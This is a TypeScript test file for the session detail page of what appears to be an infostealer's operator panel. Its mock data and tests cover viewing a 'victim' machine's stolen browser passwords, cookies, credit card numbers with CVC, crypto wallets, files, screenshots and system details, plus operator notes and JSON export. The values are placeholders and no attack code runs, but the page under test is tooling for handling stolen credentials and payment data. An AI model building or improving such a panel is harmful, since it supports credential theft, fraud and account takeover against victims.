import { describe, it, expect, vi, beforeEach, afterEach, beforeAll } from 'vitest'
import { render, screen, fireEvent, waitFor } from '@testing-library/react'
import { MemoryRouter, Routes, Route } from 'react-router-dom'
import { QueryClient, QueryClientProvider } from '@tanstack/react-query'
import { I18nProvider } from '@/lib/i18n'

vi.mock('@/lib/api', () => ({
  api: {
    get: vi.fn(),
    post: vi.fn(),
    put: vi.fn(),
    del: vi.fn(),
    fetchCsrf: vi.fn().mockResolvedValue(null),
    clearCsrf: vi.fn(),
  },
}))

import { api } from '@/lib/api'
import SessionDetail from './SessionDetail'

const qc = () => new QueryClient({ defaultOptions: { queries: { retry: false } } })
const renderPage = () =>
  render(
    <QueryClientProvider client={qc()}>
      <MemoryRouter initialEntries={['/sessions/abc']}>
        <I18nProvider>
          <Routes>
            <Route path="/sessions/:id" element={<SessionDetail />} />
          </Routes>
        </I18nProvider>
      </MemoryRouter>
    </QueryClientProvider>,
  )

// Radix Tabs activates on mousedown, not click.
const switchTab = (tab: HTMLElement) => {
  fireEvent.mouseDown(tab)
  fireEvent.click(tab)
}

const sessionDetail = {
  id: 'abc',
  ip: '203.0.113.7',
  country_code: 'DE',
  hwid: 'hwid-abc',
  os: 'Windows 11',
  username: 'victim',
  build_id: 'b1',
  created_at: '2026-01-01T00:00:00Z',
  passwords_count: 1,
  cookies_count: 1,
  cards_count: 1,
  wallets_count: 1,
  passwords: [
    { id: 'p1', session_id: 'abc', url: 'example.com', username: 'u1', password_value: 'secret1', browser: 'Chrome' },
  ],
  cookies: [{ id: 'c1', session_id: 'abc', domain: '.example.com', name: 'sid', value: 'abc123', path: '/' }],
  cards: [{ id: 'cd1', session_id: 'abc', number: '4111111111111111', exp_month: '12', exp_year: '2028', holder: 'J DOE', cvc: '123' }],
  wallets: [{ id: 'w1', name: 'MetaMask', path: '/wallet' }],
  files: [
    { id: 'f1', filename: 'passwords.txt', size: 2048 },
    { id: 'f2', filename: 'empty.bin', size: 0 },
  ],
  system_info: {
    cpu: 'i7-13700K',
    gpu: 'RTX 4080',
    ram: '16GB',
    os: 'Windows 11',
    screen: '1920x1080',
    hostname: 'pc1',
    local_ip: '10.0.0.5',
    mac: 'AA:BB:CC:DD:EE:FF',
  },
}

const notes = [
  { id: 'n1', session_id: 'abc', content: 'First note', created_by: 'admin', created_at: '2026-01-02T00:00:00Z' },
]

const notFound404 = { ok: false, status: 404, json: async () => ({}) } as unknown as Response
const gone410 = { ok: false, status: 410, json: async () => ({}) } as unknown as Response

function bmpResponse() {
  const buf = new Uint8Array(54)
  buf[0] = 0x42
  buf[1] = 0x4d // 'BM'
  const dv = new DataView(buf.buffer)
  dv.setUint32(14, 40, true) // info header size
  dv.setInt32(18, 1920, true) // width
  dv.setInt32(22, 1080, true) // height
  return {
    ok: true,
    status: 200,
    headers: new Headers({ 'Content-Length': '5000', 'Content-Type': 'image/bmp' }),
    arrayBuffer: async () => buf.buffer,
  } as unknown as Response
}

beforeAll(() => {
  Object.defineProperty(URL, 'createObjectURL', {
    configurable: true,
    value: vi.fn(() => 'blob:fake'),
  })
  Object.defineProperty(URL, 'revokeObjectURL', {
    configurable: true,
    value: vi.fn(),
  })
})

beforeEach(() => {
  localStorage.clear()
  vi.clearAllMocks()
  vi.mocked(api.get).mockImplementation((url: string) => {
    if (url === '/api/sessions/abc') return Promise.resolve(sessionDetail)
    if (url === '/api/sessions/abc/notes') return Promise.resolve(notes)
    return Promise.resolve({})
  })
  vi.mocked(api.post).mockResolvedValue({})
  vi.mocked(api.del).mockResolvedValue({})
  // Screenshot fetch: default 404 (absent) so the header stays clean.
  vi.stubGlobal('fetch', vi.fn().mockResolvedValue(notFound404))
})

afterEach(() => {
  vi.unstubAllGlobals()
})

describe('SessionDetail', () => {
  it('shows skeletons while loading', () => {
    const { promise } = Promise.withResolvers<unknown>()
    vi.mocked(api.get).mockImplementation(() => promise as Promise<never>)
    const { container } = renderPage()
    expect(container.querySelector('.h-8')).toBeTruthy()
    expect(container.querySelector('.h-64')).toBeTruthy()
  })

  it('shows the not-found view when the session is missing', async () => {
    vi.mocked(api.get).mockImplementation((url: string) => {
      if (url === '/api/sessions/abc') return Promise.resolve(null)
      return Promise.resolve([])
    })
    renderPage()
    expect(await screen.findByText('Session not found')).toBeInTheDocument()
    expect(screen.getByRole('button', { name: 'Back to Sessions' })).toBeInTheDocument()
  })

  it('renders the session header and the passwords tab', async () => {
    renderPage()
    expect(await screen.findByText('203.0.113.7')).toBeInTheDocument()
    expect(screen.getByText('hwid-abc')).toBeInTheDocument()
    expect(screen.getByText('victim')).toBeInTheDocument()
    expect(screen.getByRole('tab', { name: 'Passwords (1)' })).toBeInTheDocument()
    expect(screen.getByText('example.com')).toBeInTheDocument()
    expect(screen.getByText('u1')).toBeInTheDocument()
    expect(screen.getByText('••••••••')).toBeInTheDocument()
  })

  it('reveals a password when the eye button is clicked', async () => {
    renderPage()
    await screen.findByText('203.0.113.7')
    fireEvent.click(document.querySelector('.lucide-eye')!.closest('button')!)
    expect(screen.getByText('secret1')).toBeInTheDocument()
  })

  it('switches to the cookies tab', async () => {
    renderPage()
    await screen.findByText('203.0.113.7')
    switchTab(screen.getByRole('tab', { name: 'Cookies (1)' }))
    expect(screen.getByText('.example.com')).toBeInTheDocument()
    expect(screen.getByText('sid')).toBeInTheDocument()
    expect(screen.getByText('abc123')).toBeInTheDocument()
  })

  it('switches to the cards tab and reveals the CVC', async () => {
    renderPage()
    await screen.findByText('203.0.113.7')
    switchTab(screen.getByRole('tab', { name: 'Cards (1)' }))
    expect(screen.getByText('•••• •••• •••• 1111')).toBeInTheDocument()
    expect(screen.getByText('12/2028')).toBeInTheDocument()
    expect(screen.getByText('J DOE')).toBeInTheDocument()
    fireEvent.click(screen.getByText('•••'))
    expect(screen.getByText('123')).toBeInTheDocument()
  })

  it('switches to the wallets tab', async () => {
    renderPage()
    await screen.findByText('203.0.113.7')
    switchTab(screen.getByRole('tab', { name: 'Wallets (1)' }))
    expect(screen.getByText('MetaMask')).toBeInTheDocument()
    expect(screen.getByText('/wallet')).toBeInTheDocument()
  })

  it('switches to the files tab and formats sizes', async () => {
    renderPage()
    await screen.findByText('203.0.113.7')
    switchTab(screen.getByRole('tab', { name: 'Files (2)' }))
    expect(screen.getByText('passwords.txt')).toBeInTheDocument()
    expect(screen.getByText('2 KB')).toBeInTheDocument()
    expect(screen.getByText('0 B')).toBeInTheDocument()
  })

  it('switches to the system info tab', async () => {
    renderPage()
    await screen.findByText('203.0.113.7')
    switchTab(screen.getByRole('tab', { name: 'System Info' }))
    expect(screen.getByText('i7-13700K')).toBeInTheDocument()
    expect(screen.getByText('RTX 4080')).toBeInTheDocument()
    expect(screen.getByText('10.0.0.5')).toBeInTheDocument()
  })

  it('shows the absent screenshot message', async () => {
    renderPage()
    await screen.findByText('203.0.113.7')
    switchTab(screen.getByRole('tab', { name: 'Screenshot' }))
    expect(await screen.findByText('No screenshot was captured for this session')).toBeInTheDocument()
  })

  it('shows the gone screenshot message on 410', async () => {
    vi.mocked(globalThis.fetch).mockResolvedValue(gone410)
    renderPage()
    await screen.findByText('203.0.113.7')
    switchTab(screen.getByRole('tab', { name: 'Screenshot' }))
    expect(await screen.findByText('Screenshot file is missing on the server')).toBeInTheDocument()
  })

  it('renders a present screenshot with dimensions and a thumbnail', async () => {
    vi.mocked(globalThis.fetch).mockResolvedValue(bmpResponse())
    renderPage()
    await screen.findByText('203.0.113.7')
    // Header thumbnail button appears when the screenshot is present.
    expect(screen.getByRole('button', { name: 'Screenshot' })).toBeInTheDocument()
    switchTab(screen.getByRole('tab', { name: 'Screenshot' }))
    expect(await screen.findByText(/1920×1080 · 5 KB/)).toBeInTheDocument()
    expect(screen.getByText('Open full size')).toBeInTheDocument()
  })

  it('adds a note', async () => {
    renderPage()
    await screen.findByText('203.0.113.7')
    switchTab(screen.getByRole('tab', { name: 'Notes' }))
    expect(await screen.findByText('First note')).toBeInTheDocument()
    fireEvent.change(screen.getByPlaceholderText('Add a note...'), { target: { value: 'hello world' } })
    fireEvent.click(screen.getByRole('button', { name: 'Add Note' }))
    await waitFor(() => {
      expect(api.post).toHaveBeenCalledWith('/api/sessions/abc/notes', { content: 'hello world' })
    })
  })

  it('deletes a note', async () => {
    renderPage()
    await screen.findByText('203.0.113.7')
    switchTab(screen.getByRole('tab', { name: 'Notes' }))
    await screen.findByText('First note')
    const trashButtons = document.querySelectorAll('.lucide-trash-2')
    fireEvent.click(trashButtons[trashButtons.length - 1]!.closest('button')!)
    await waitFor(() => {
      expect(api.del).toHaveBeenCalledWith('/api/notes/n1')
    })
  })

  it('exports the session as JSON from the dropdown', async () => {
    const openSpy = vi.spyOn(window, 'open').mockImplementation(() => null)
    renderPage()
    await screen.findByText('203.0.113.7')
    const exportBtn = screen.getByRole('button', { name: /Export/ })
    fireEvent.pointerDown(exportBtn)
    fireEvent.click(exportBtn)
    fireEvent.click(await screen.findByText('Export as JSON'))
    expect(openSpy).toHaveBeenCalledWith('/api/export/session/abc?format=json')
    openSpy.mockRestore()
  })
})
